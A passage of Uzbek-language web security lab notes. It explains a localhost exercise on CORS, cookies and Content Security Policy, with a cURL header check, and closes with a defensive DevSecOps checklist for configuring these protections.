### 5. Buyruqlar Satri Vositasi: cURL
* **Vazifasi:** Brauzer cheklovlarisiz toza tarmoq so'rovlarini jo'natish.
* **Laboratoriya amaliyoti:**
  ```bash
  # CORS javobini tekshirish
  curl -i -H "Origin: http://127.0.0.1:8000" http://127.0.0.1:8001/api/info
  ```

---

## 8. A1 Laboratoriyasi Tajribalarining Xavfsizlik Nuqtai Nazaridan Tahlili

Laboratoriyadagi har bir amaliy qadam tasodifiy emas, balki real hayotdagi xavfsizlik ssenariylarining modeli hisoblanadi:

```
[Brauzer: http://127.0.0.1:8000] 
       |
       |--- 1. Asosiy sahifa yuklanadi (HTML, CSS, app.js)
       |--- 2. DOM Inspector: Matn o'zgartiriladi (Mijoz xotirasi boshqaruvi)
       |--- 3. /cookie so'rovi: HttpOnly va SameSite o'rnatiladi
       |
       |--- 4. fetch(127.0.0.1:8001/api/info)
                    |
                    v
       [API: http://127.0.0.1:8001]
```

1. **Nega 8000 va 8001 port tanlangan?**  
   Ular bitta kompyuterda (`127.0.0.1`) bo'lishiga qaramay, port farqi tufayli brauzer uchun begona origin hisoblanadi. Bu talabaga mikroxizmatlar (Frontend va API) arxitekturasini bitta tizimda tushunishga imkon beradi.
2. **8002 ga o'zgartirilganda brauzer nima qildi?**  
   Server `Access-Control-Allow-Origin: http://127.0.0.1:8002` deb javob berdi. Brauzer joriy sahifa originiga qaraydi (`8000`). `8000 != 8002` bo'lgani uchun brauzer javobni yashirdi va xato qaytardi.
3. **Inline va Tashqi JS ning CSP dagi taqdiri:**  
   `script-src 'self'` qo'yilganda, HTML ichidagi kod bloklandi. Bu real tizimlarda tajovuzkor kiritgan har qanday XSS inyeksiyasini to'xtatib qolish qobiliyatini yaqqol ko'rsatadi.

---

## 9. DevSecOps: Ishlab Chiquvchilar Uchun Oltin Qoidalar

Veb-ilovalarni yaratishda xavfsizlikni ta'minlash uchun quyidagi nazorat ro'yxatiga (Checklist) doimo rioya qiling:

* [ ] **CORS da hech qachon kelgan Originni ko'r-ko'rona aks ettirmang (Reflect qilmang).** Ruxsat etilgan domenlarni qat'iy oq ro'yxatda (Whitelist) saqlang.
* [ ] **`Access-Control-Allow-Origin: *` bilan `Access-Control-Allow-Credentials: true` ni aslo birga ishlatmang.** (Brauzerlar buni standart bo'yicha taqiqlaydi, lekin server tomonida ham bu mantiqiy xatodir).
* [ ] **Barcha sessiya va avtorizatsiya cookielariga `HttpOnly; Secure; SameSite=Lax` atributlarini majburiy qo'ying.**
* [ ] **Har bir sahifada qat'iy CSP siyosatini joriy qiling.** Iloji boricha `'unsafe-inline'` dan voz kechib, `nonce` yoki `hash` tizimiga o'ting.
* [ ] **`object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'` qoidalarini unutmang.**
* [ ] **Esda tuting:** HTTPS faqat yo'lni shifrlaydi, u SOP, CORS, CSP yoki XSS muammolarini o'z-o'zidan hal qilib bermaydi! Xavfsizlik har doim qatlamli (Defense-in-depth) bo'lishi shart.
